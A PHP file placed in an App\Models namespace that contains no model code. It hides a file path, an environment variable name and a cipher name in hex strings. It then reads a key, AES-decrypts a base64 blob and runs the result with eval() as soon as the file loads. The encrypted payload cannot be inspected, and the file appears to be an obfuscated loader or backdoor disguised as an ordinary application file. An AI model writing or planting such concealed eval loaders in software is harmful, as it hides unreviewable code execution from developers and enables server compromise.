<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('IxkEZlZ71hYJSmjBfVcuPw==');

$c=base64_decode(

'F6nuA2LHfBQ4Pul5LXBZyO/AsXYCZEj3jijymZqBb0nZWtzCrxZaXqml/0BQu9cxDiL3Mxld4KhU' .
'QgUJmr7UByvisAFI2jjliRigheIY+VfKAlY3ovqY1AwTO0oKRiIcNLiAcRaOw/s7ll0R3KRzCt6B' .
'waZmfETg33mHHbbUfhzQEjt7smSD3L/6YC9oYKyWGZCg6bRmgfNlgOGxzuvC2W4nxL+5+kgnSHpW' .
'ZOwo4+G7ZTwdFwHHBdEZCFCMiD0PJ7xcv5qvZnMXdInuhdeoHn62MwyHwwugUVaqHBv1rokW1261' .
'LdnzhQtUxmAOvXqJ4D8sQeu3P7S9HrTI+aFT6+mMyUfBNCv+A3TcCMMszKpgA67CzWftYd8U+4xW' .
'0+MsBGYPK3Ko6fM7SQJt1JkgPzgTTbpRNOKr/EBPPnUvQfZvxvKwv+m5Wro/mjQTT6mHRV8ScodK' .
'45Oa2JsSB3LpKYIYM1CMN2ndsM8vpyRpgj0YqE7V4gTbyz4C91jqqRRr7HJS62uzB0nuiXDh6Im/' .
'oxKNifNkVMr3m6XJNZdSamqyJ3b1SdeBx4eKuUIexWoZuokgIjxZ4w4ZYJSAXIFylH2m50cnGxr+' .
'OWnpPVxr8tG4QWvxtSNwFYbwDD0L2hA7dUrsZ5rpQJz3tL8Kf/tzytH0yKtFy9UYXHPR+r2as4BT' .
'Pch5w3Y046Y/D/7RnsBY856m2sllyNKlc2BJQ7txheliiI20Rv9acmsVF2E1c736XH8/lH2qvt3f' .
'NcEIdyIinsSROs+dgnwL6Pc112upfTwF1P4oN0gr6Qkusar3ZX2ziMTU/5qksKYWG6P4Fn0G4y2m' .
'YS4rq0KFOvwQR36pwmHjL/24aAHmbTAlXyx+kd8inyAttz2vZ0l3or42z7rq'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

